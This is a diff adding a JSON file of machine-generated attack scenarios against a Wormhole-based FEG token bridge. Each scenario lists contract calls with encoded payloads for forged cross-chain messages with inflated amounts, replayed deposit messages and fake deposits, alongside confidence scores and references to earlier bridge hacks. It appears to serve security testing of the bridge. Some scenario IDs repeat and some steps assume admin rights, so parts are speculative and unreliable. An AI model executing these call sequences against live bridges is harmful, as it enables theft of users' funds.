@@ -1,0 +1,699 @@
+{
+  "bridge_name": "feg_bridge_2024",
+  "scenarios": [
+    {
+      "scenario_id": "fegbridge_exploit_20231001",
+      "target_invariant": "asset_conservation_lock_mint",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "qubit_20220127",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcFEG",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "FEGBridgeSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Attacker approves FEGBridgeSrc to spend their tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "FEGBridgeSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Attacker deposits tokens to bridge, triggering Wormhole message"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "receiveMessage(address,bytes)",
+          "params": {
+            "sourceAddress": "FEGBridgeSrc",
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000ad78ebc5ac6200000"
+          },
+          "description": "Attacker sends forged message with double the deposited amount"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker approves FEGBridgeSrc to spend their tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attacker deposits tokens to bridge, triggering Wormhole message"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Attacker sends forged message with double the deposited amount"
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_exploit_1",
+      "target_invariant": "authorization_lock",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "FEGBridgeSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000"
+          },
+          "description": "Attacker calls deposit with a large amount they don't have, hoping the bridge will process it without proper balance checks"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000003635c9adc5dea00000"
+          },
+          "description": "Attacker directly publishes a fake message to WormholeCore to trigger the bridge release"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker calls deposit with a large amount they don't have, hoping the bridge will process it without proper balance checks"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attacker directly publishes a fake message to WormholeCore to trigger the bridge release"
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_attack_1",
+      "target_invariant": "authorization_message_relay",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "nomad_20220801",
+        "chainswap_20210711"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcFEG",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "FEGBridgeSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "FEGBridgeSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens to bridge, triggering message publication"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "receiveMessage(address,bytes)",
+          "params": {
+            "sourceAddress": "FEGBridgeSrc",
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000ad78ebc5ac6200000"
+          },
+          "description": "Directly call receiveMessage with inflated amount before relayer processes the real message"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens to bridge, triggering message publication"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Directly call receiveMessage with inflated amount before relayer processes the real message"
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_replay_attack",
+      "target_invariant": "uniqueness_message",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcFEG",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "FEGBridgeSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "FEGBridgeSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens to bridge, triggering a Wormhole message"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "receiveMessage(address,bytes)",
+          "params": {
+            "sourceAddress": "FEGBridgeSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "First relay of the message to receive tokens on destination"
+        },
+        {
+          "step": 4,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "receiveMessage(address,bytes)",
+          "params": {
+            "sourceAddress": "FEGBridgeSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Replay the same message to receive tokens again"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens to bridge, triggering a Wormhole message"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "First relay of the message to receive tokens on destination"
+        },
+        {
+          "waypoint_id": "w4",
+          "after_step": 4,
+          "predicate": "step_4_executed",
+          "description": "Replay the same message to receive tokens again"
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_exploit",
+      "target_invariant": "uniqueness_transfer",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "thorchain_20210629"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcFEG",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "FEGBridgeSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Attacker approves FEGBridgeSrc to spend their tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "FEGBridgeSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Attacker deposits tokens into the bridge"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "receiveMessage(address,bytes)",
+          "params": {
+            "sourceAddress": "FEGBridgeSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Attacker replays the same deposit message to receive tokens again"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker approves FEGBridgeSrc to spend their tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attacker deposits tokens into the bridge"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Attacker replays the same deposit message to receive tokens again"
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_exploit_1",
+      "target_invariant": "asset_conservation_transfer",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "thorchain_20210716"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcFEG",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "FEGBridgeSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "FEGBridgeSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit 100 tokens to bridge, which will trigger a cross-chain transfer"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "receiveMessage(address,bytes)",
+          "params": {
+            "sourceAddress": "FEGBridgeSrc",
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000ad78ebc5ac6200000"
+          },
+          "description": "Directly call receiveMessage with inflated amount (200 instead of 100), bypassing the actual transfer check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit 100 tokens to bridge, which will trigger a cross-chain transfer"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Directly call receiveMessage with inflated amount (200 instead of 100), bypassing the actual transfer check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "fake_deposit_exploit",
+      "target_invariant": "authorization_transfer",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "WormholeCore",
+          "function": "publishMessage(bytes)",
+          "params": {
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000003635c9adc5dea00000"
+          },
+          "description": "Attacker publishes a fake deposit message to WormholeCore, pretending to be FEGBridgeSrc."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker publishes a fake deposit message to WormholeCore, pretending to be FEGBridgeSrc."
+        }
+      ]
+    },
+    {
+      "scenario_id": "fegbridge_exploit_20231001",
+      "target_invariant": "asset_conservation_lock_transfer",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "synapse_20211109"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcFEG",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "FEGBridgeSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve FEGBridgeSrc to spend attacker's SrcFEG tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "FEGBridgeSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit SrcFEG tokens to bridge, triggering Wormhole message"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "setTrusted(address,bool)",
+          "params": {
+            "src": "attacker",
+            "ok": true
+          },
+          "description": "Set attacker's address as trusted source (assuming admin privileges)"
+        },
+        {
+          "step": 4,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "receiveMessage(address,bytes)",
+          "params": {
+            "sourceAddress": "attacker",
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000ad78ebc5ac6200000"
+          },
+          "description": "Receive forged message claiming larger deposit amount"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve FEGBridgeSrc to spend attacker's SrcFEG tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit SrcFEG tokens to bridge, triggering Wormhole message"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Set attacker's address as trusted source (assuming admin privileges)"
+        },
+        {
+          "waypoint_id": "w4",
+          "after_step": 4,
+          "predicate": "step_4_executed",
+          "description": "Receive forged message claiming larger deposit amount"
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_replay_attack",
+      "target_invariant": "uniqueness_lock",
+      "vulnerability_class": "message_replay",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "wormhole_20220202",
+        "polynetwork_20210810"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcFEG",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "FEGBridgeSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "FEGBridgeSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens to bridge, creating a message"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "receiveMessage(address,bytes)",
+          "params": {
+            "sourceAddress": "FEGBridgeSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Replay the same message to receive tokens again"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens to bridge, creating a message"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Replay the same message to receive tokens again"
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_exploit_1",
+      "target_invariant": "asset_conservation_mint_transfer",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "bnbbridge_20221007"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcFEG",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "FEGBridgeSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "FEGBridgeSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit 100 tokens to bridge, which will trigger a cross-chain transfer"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "receiveMessage(address,bytes)",
+          "params": {
+            "sourceAddress": "FEGBridgeSrc",
+            "payload": "0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000ad78ebc5ac6200000"
+          },
+          "description": "Exploit the bridge by sending a fake message with double the deposited amount"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit 100 tokens to bridge, which will trigger a cross-chain transfer"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Exploit the bridge by sending a fake message with double the deposited amount"
+        }
+      ]
+    },
+    {
+      "scenario_id": "feg_bridge_exploit_20231001",
+      "target_invariant": "uniqueness_refund",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "thorchain_20210628",
+        "thorchain_20210629"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcFEG",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "FEGBridgeSrc",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "FEGBridgeSrc",
+          "function": "deposit(address,uint256)",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens to bridge, triggering relay"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "FEGSmartBridge",
+          "function": "receiveMessage(address,bytes)",
+          "params": {
+            "sourceAddress": "FEGBridgeSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Replay the deposit message to mint tokens again"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve FEGBridgeSrc to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens to bridge, triggering relay"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Replay the deposit message to mint tokens again"
+        }
+      ]
+    }
+  ]
+}
